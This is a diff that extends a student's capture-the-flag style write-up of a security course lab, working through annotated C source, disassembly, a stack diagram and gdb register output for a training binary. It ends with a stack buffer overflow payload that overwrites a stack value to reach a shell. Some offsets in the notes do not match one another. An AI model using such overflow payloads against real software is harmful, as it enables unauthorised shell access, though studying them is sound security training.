@@ -348,8 +348,11 @@ students24@appsec2026:/levels/level7$ cat level7.c
 
 
 int main(){
-        int* myvalue = (int*) malloc(sizeof(int));
-        *myvalue = special_value();
+        int* myvalue = (int*) malloc(sizeof(int)); <--- allocate heap (store ptr in stack)
+
+       8 + 8 + 8 + 8 + 8 + 16
+
+        *myvalue = special_value();                <--- write value               
         int final = 0;
 
         printf("Can you please help me solve a difficult problem?\n");
@@ -366,10 +369,11 @@ int main(){
 
 
         printf("You are very good at maths!\nEnter your username: ");
-        char name[16];
+        char name[16]; <--- also stored on stack
         scanf("%s", &name);
+       
 
-        if (final == *myvalue){
+        if (final == *myvalue){ <---- look for JEQ instruction
                 printf("You solved another problem today!\n");
                 execl("/bin/sh", "/bin/sh", (char*)NULL);
         }
@@ -382,4 +386,195 @@ int main(){
 }
 ```
 
-Looking at the ASM...
+Looking at the ASM for main
+```
+00000000000012d8 <main>:
+    12d8:       f3 0f 1e fa             endbr64
+    12dc:       55                      push   %rbp
+    12dd:       48 89 e5                mov    %rsp,%rbp
+    12e0:       48 83 ec 30             sub    $0x30,%rsp
+    12e4:       bf 04 00 00 00          mov    $0x4,%edi
+    12e9:       e8 32 fe ff ff          call   1120 <malloc@plt>
+    12ee:       48 89 45 f8             mov    %rax,-0x8(%rbp)
+    12f2:       b8 00 00 00 00          mov    $0x0,%eax
+    12f7:       e8 4d ff ff ff          call   1249 <special_value>
+    12fc:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+    1300:       89 02                   mov    %eax,(%rdx)
+    1302:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%rbp)
+    1309:       48 8d 05 f8 0c 00 00    lea    0xcf8(%rip),%rax        # 2008 <_IO_stdin_used+0x8>
+    1310:       48 89 c7                mov    %rax,%rdi
+    1313:       e8 b8 fd ff ff          call   10d0 <puts@plt>
+    1318:       bf 00 00 00 00          mov    $0x0,%edi
+    131d:       e8 ee fd ff ff          call   1110 <time@plt>
+    1322:       89 c7                   mov    %eax,%edi
+    1324:       e8 d7 fd ff ff          call   1100 <srand@plt>
+    1329:       e8 22 fe ff ff          call   1150 <rand@plt>
+    132e:       89 c2                   mov    %eax,%edx
+    1330:       48 63 c2                movslq %edx,%rax
+    1333:       48 69 c0 67 66 66 66    imul   $0x66666667,%rax,%rax
+    133a:       48 c1 e8 20             shr    $0x20,%rax
+    133e:       c1 f8 02                sar    $0x2,%eax
+    1341:       89 d1                   mov    %edx,%ecx
+    1343:       c1 f9 1f                sar    $0x1f,%ecx
+    1346:       29 c8                   sub    %ecx,%eax
+    1348:       89 45 f0                mov    %eax,-0x10(%rbp)
+    134b:       8b 4d f0                mov    -0x10(%rbp),%ecx
+    134e:       89 c8                   mov    %ecx,%eax
+    1350:       c1 e0 02                shl    $0x2,%eax
+    1353:       01 c8                   add    %ecx,%eax
+    1355:       01 c0                   add    %eax,%eax
+    1357:       29 c2                   sub    %eax,%edx
+    1359:       89 55 f0                mov    %edx,-0x10(%rbp)
+    135c:       e8 ef fd ff ff          call   1150 <rand@plt>
+    1361:       89 c2                   mov    %eax,%edx
+    1363:       48 63 c2                movslq %edx,%rax
+    1366:       48 69 c0 67 66 66 66    imul   $0x66666667,%rax,%rax
+    136d:       48 c1 e8 20             shr    $0x20,%rax
+    1371:       c1 f8 02                sar    $0x2,%eax
+    1374:       89 d1                   mov    %edx,%ecx
+    1376:       c1 f9 1f                sar    $0x1f,%ecx
+    1379:       29 c8                   sub    %ecx,%eax
+    137b:       89 45 ec                mov    %eax,-0x14(%rbp)
+    137e:       8b 4d ec                mov    -0x14(%rbp),%ecx
+    1381:       89 c8                   mov    %ecx,%eax
+    1383:       c1 e0 02                shl    $0x2,%eax
+    1386:       01 c8                   add    %ecx,%eax
+    1388:       01 c0                   add    %eax,%eax
+    138a:       29 c2                   sub    %eax,%edx
+    138c:       89 55 ec                mov    %edx,-0x14(%rbp)
+    138f:       8b 55 ec                mov    -0x14(%rbp),%edx
+    1392:       8b 45 f0                mov    -0x10(%rbp),%eax
+    1395:       89 c6                   mov    %eax,%esi
+    1397:       48 8d 05 9c 0c 00 00    lea    0xc9c(%rip),%rax        # 203a <_IO_stdin_used+0x3a>
+    139e:       48 89 c7                mov    %rax,%rdi
+    13a1:       b8 00 00 00 00          mov    $0x0,%eax
+    13a6:       e8 45 fd ff ff          call   10f0 <printf@plt>
+    13ab:       c7 45 e8 00 00 00 00    movl   $0x0,-0x18(%rbp)
+    13b2:       48 8d 45 e8             lea    -0x18(%rbp),%rax
+    13b6:       48 89 c6                mov    %rax,%rsi
+    13b9:       48 8d 05 87 0c 00 00    lea    0xc87(%rip),%rax        # 2047 <_IO_stdin_used+0x47>
+    13c0:       48 89 c7                mov    %rax,%rdi
+    13c3:       b8 00 00 00 00          mov    $0x0,%eax
+    13c8:       e8 63 fd ff ff          call   1130 <__isoc99_scanf@plt>
+    13cd:       8b 45 f0                mov    -0x10(%rbp),%eax
+    13d0:       0f af 45 ec             imul   -0x14(%rbp),%eax
+    13d4:       89 c2                   mov    %eax,%edx
+    13d6:       8b 45 e8                mov    -0x18(%rbp),%eax
+    13d9:       39 c2                   cmp    %eax,%edx
+
+------------------------------------------------------------------------------------
+                                   JE instruction to compare myvalue with input EDX is myvalue (local var)
+                                   so we need a way to make sure that the value referenced on the heap is zero
+    13db:       74 19                   je     13f6 <main+0x11e>
+    13dd:       48 8d 05 6c 0c 00 00    lea    0xc6c(%rip),%rax        # 2050 <_IO_stdin_used+0x50>
+    13e4:       48 89 c7                mov    %rax,%rdi
+    13e7:       e8 e4 fc ff ff          call   10d0 <puts@plt>
+    13ec:       b8 01 00 00 00          mov    $0x1,%eax
+    13f1:       e9 8e 00 00 00          jmp    1484 <main+0x1ac>
+    13f6:       48 8d 05 8b 0c 00 00    lea    0xc8b(%rip),%rax        # 2088 <_IO_stdin_used+0x88>
+    13fd:       48 89 c7                mov    %rax,%rdi
+    1400:       b8 00 00 00 00          mov    $0x0,%eax
+    1405:       e8 e6 fc ff ff          call   10f0 <printf@plt>
+    140a:       48 8d 45 d0             lea    -0x30(%rbp),%rax
+    140e:       48 89 c6                mov    %rax,%rsi
+    1411:       48 8d 05 a2 0c 00 00    lea    0xca2(%rip),%rax        # 20ba <_IO_stdin_used+0xba>
+    1418:       48 89 c7                mov    %rax,%rdi
+    141b:       b8 00 00 00 00          mov    $0x0,%eax
+    1420:       e8 0b fd ff ff          call   1130 <__isoc99_scanf@plt>
+    1425:       48 8b 45 f8             mov    -0x8(%rbp),%rax
+    1429:       8b 00                   mov    (%rax),%eax
+    142b:       39 45 f4                cmp    %eax,-0xc(%rbp)
+    142e:       75 34                   jne    1464 <main+0x18c>
+    1430:       48 8d 05 89 0c 00 00    lea    0xc89(%rip),%rax        # 20c0 <_IO_stdin_used+0xc0>
+    1437:       48 89 c7                mov    %rax,%rdi
+    143a:       e8 91 fc ff ff          call   10d0 <puts@plt>
+    143f:       ba 00 00 00 00          mov    $0x0,%edx
+    1444:       48 8d 05 97 0c 00 00    lea    0xc97(%rip),%rax        # 20e2 <_IO_stdin_used+0xe2>
+    144b:       48 89 c6                mov    %rax,%rsi
+    144e:       48 8d 05 8d 0c 00 00    lea    0xc8d(%rip),%rax        # 20e2 <_IO_stdin_used+0xe2>
+    1455:       48 89 c7                mov    %rax,%rdi
+    1458:       b8 00 00 00 00          mov    $0x0,%eax
+    145d:       e8 de fc ff ff          call   1140 <execl@plt>
+    1462:       eb 1b                   jmp    147f <main+0x1a7>
+    1464:       48 8d 45 d0             lea    -0x30(%rbp),%rax
+    1468:       48 89 c6                mov    %rax,%rsi
+    146b:       48 8d 05 7e 0c 00 00    lea    0xc7e(%rip),%rax        # 20f0 <_IO_stdin_used+0xf0>
+    1472:       48 89 c7                mov    %rax,%rdi
+    1475:       b8 00 00 00 00          mov    $0x0,%eax
+    147a:       e8 71 fc ff ff          call   10f0 <printf@plt>
+    147f:       b8 00 00 00 00          mov    $0x0,%eax
+    1484:       c9                      leave
+    1485:       c3                      ret
+```
+
+Looking at the ASM and the source code at execution time our stack will look similar to this:
+┌─────────────────────────────┐  <--- rsp
+│                             │  rbp-0x38 │
+│        char name[16]        │           │ 16 bytes
+│                             │  rbp-0x30 │
+├─────────────────────────────┤
+│      int input number       │  rbp-0x28 │ 8 bytes
+├─────────────────────────────┤
+│           int x             │  rbp-0x20 │ 8 bytes
+├─────────────────────────────┤
+│           int y             │  rbp-0x18 │ 8 bytes
+├─────────────────────────────┤
+│         int final           │  rbp-0x10 │ 8 bytes
+├─────────────────────────────┤
+│    ptr to special value     │  rbp-0x8  │ 8 bytes
+├─────────────────────────────┤
+│         saved RBP           │  rbp      │ 8 bytes
+├─────────────────────────────┤
+│         saved RIP           │  rbp+0x8  │ 8 bytes
+└─────────────────────────────┘
+
+Debugging further, we can set a breakpoint during our comparison call
+```
+   0x000055555555542b <+339>:   cmp    DWORD PTR [rbp-0xc],eax
+   0x000055555555542e <+342>:   jne    0x555555555464 <main+396> <--- break here
+```
+can check what values are being compared (eax to be assumed the special value, edx the test value)
+
+Reading the frame info
+```
+rax            0x2c41              11329
+rbx            0x7fffffffe358      140737488347992
+rcx            0x0                 0
+rdx            0x0                 0
+rsi            0xa                 10
+rdi            0x7fffffffdcc0      140737488346304
+rbp            0x7fffffffe230      0x7fffffffe230
+rsp            0x7fffffffe200      0x7fffffffe200
+r8             0xa                 10
+r9             0xffffffff          4294967295
+r10            0xffffffffffffff88  -120
+r11            0x7ffff7e038e0      140737352055008
+r12            0x1                 1
+r13            0x0                 0
+r14            0x555555557d80      93824992247168
+r15            0x7ffff7ffd000      140737354125312
+rip            0x55555555542e      0x55555555542e <main+342>
+eflags         0x293               [ CF AF SF IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+fs_base        0x7ffff7fb2740      140737353819968
+```
+
+Our test value is at rbp-0xc, therefore we need to overwrite 36 bytes before overwriting the last two bytes for the special value
+which we can simply read by dumping it from memory using gdb (stored in RAX)
+bp:
+`0x000055555555542e`
+`perl -e '"A"x36 . "\x41\x2c"'`
+
+payload:
+`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,`
+result:
+```
+Permanently added students24 to group level7, congratulations!
+/!\ Remember to log in again to reload your groups. /!\
+```
+
